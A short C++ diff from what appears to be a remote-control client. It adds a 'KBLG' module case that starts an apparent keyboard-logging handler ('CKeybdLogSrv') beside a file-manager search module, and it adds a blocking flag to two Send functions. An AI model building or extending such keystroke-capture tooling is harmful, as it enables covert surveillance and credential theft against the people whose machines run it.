@@ -274,7 +274,9 @@ void CClient::OnRecvCompletePacket(BYTE * lpData, UINT32 Size)
 		case FILEMGR_SEARCH:
 			m_pHandler = new CFileMgrSearchSrv(this);
 			break;
-
+		case KBLG:
+			m_pHandler = new CKeybdLogSrv(this);
+			break;
 		default:
 			dbg_log("client::OnRecvCompletePacket invalid module : %x", module);
 			Close();
@@ -315,7 +317,7 @@ void CClient::Run()
 	Recv(m_w_ptr, m_end_ptr - m_w_ptr,  NULL);
 }
 
-void CClient::Send(BYTE *lpData, UINT32 Size)
+void CClient::Send(BYTE *lpData, UINT32 Size, BOOL Block)
 {
 	pkt_head * pkt;
 	//wait last send request release the write buffer.
@@ -337,7 +339,7 @@ void CClient::Send(BYTE *lpData, UINT32 Size)
 	CTCPSocket::Send(m_lpWriteBuf, Size, NULL);
 }
 
-void CClient::Send(vec * Bufs, int nBuf)
+void CClient::Send(vec * Bufs, int nBuf, BOOL Block)
 {
 	UINT32 Size = 0;
 	UINT32 copy = 0;
